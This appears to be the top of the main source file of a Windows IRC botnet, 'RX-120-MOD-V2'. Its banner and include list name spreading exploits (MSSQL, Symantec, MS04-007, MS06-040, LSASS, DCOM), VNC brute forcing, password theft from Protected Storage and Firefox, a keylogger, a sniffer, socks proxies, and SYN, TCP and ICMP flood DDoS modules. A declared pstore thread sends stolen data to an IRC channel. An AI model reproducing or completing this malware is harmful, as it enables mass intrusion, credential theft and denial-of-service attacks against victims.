/* |  _ \ \ \/ /    / |___ \ / _ \ TesT |  \/  |/ _ \|  _ \    \ \   / /___ \ 
   | |_) | \  /_____| | __) | | | |_____| |\/| | | | | | | |____\ \ / /  __) |
   |  _ <  /  \_____| |/ __/| |_| |_____| |  | | |_| | |_| |_____\ V /  / __/ 
   |_| \_\/_/\_\ BuZ|_|_____|\___/      |_|  |_|\___/|____/  BuZ  \_/  |_____|
   ---------------------------------------------------------------------------
   --MSSQL-NTPASS-SYM06010-MS04007-MS06040-VNCBRUTE-PSTORE-FIREFOX-SP2PATCH---  
   ---------------------------------------------------------------------------
               Greets To: THE REAL CODERS & The Ryan1918 Crew !!
 */
 
#ifdef WIN32
#define _WIN32_WINNT	0x0403
#define WIN32_LEAN_AND_MEAN
#pragma optimize("gsy", on)
#pragma comment(linker,"/RELEASE")
#pragma comment(linker, "/ALIGN:4096")
#pragma comment(linker, "/IGNORE:4108 ")
#endif
////////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <malloc.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <windns.h>
#include <iphlpapi.h>
#include <lm.h>
#include <lmat.h>
#include <io.h>
#include <fcntl.h>
#include <tchar.h>
#include <tlhelp32.h>
#include <assert.h>
#include <sqlext.h>
#include <vfw.h>
#include <shlobj.h>
#include <ntsecapi.h>
////////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include "Def.h"
#include "Ldll.h"
#include "Tcp.h"
#include "120.h"
#include "Crc.h"
#include "Sys.h"
#include "Rnd.h"
#include "Ide.h"
#include "Cry.h"
#include "Str.h"
#include "Test.h"
#include "Thr.h"
#include "Shel.h"
#include "Adv.h"
#include "patcher.h"
#include "tcpip.h"
#include "sniff.h"
#include "socks4.h"
#include "key.h"
extern "C" {
#include "d3des.h"
}
#include "rfb.h"
#include "firefox.h"


////////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
#include "Scanners\Asn.h"
#include "Scanners\Netapi.h"
#include "Scanners\Sym.h"
#include "Scanners\vncshit.h"
#include "Scanners\mssql.h"
#include "Scanners\netbios.h"
#include "Scanners\lsass.h"
#include "Scanners\dcom.h"
#include "Scanners\dcass.h"
#include "Scanners\mysqludf.h"
////////////////////////////////////////////////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
#include "ddos.h"
#include "synflood.h"
#include "tcpflood.h"
#include "icmpflood.h"
#include "pingudp.h"
#include "socks5.h" 
#include "multipletopic.h"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////

////////////////////////////////////////////////////////////////////////////////////////////////////////////////
DWORD WINAPI pstore (LPVOID param);
#import "pstorec.dll" no_namespace
#include <psapi.h>

typedef struct pststrct
{
	SOCKET sock;
	char chan[128];
} pststrct;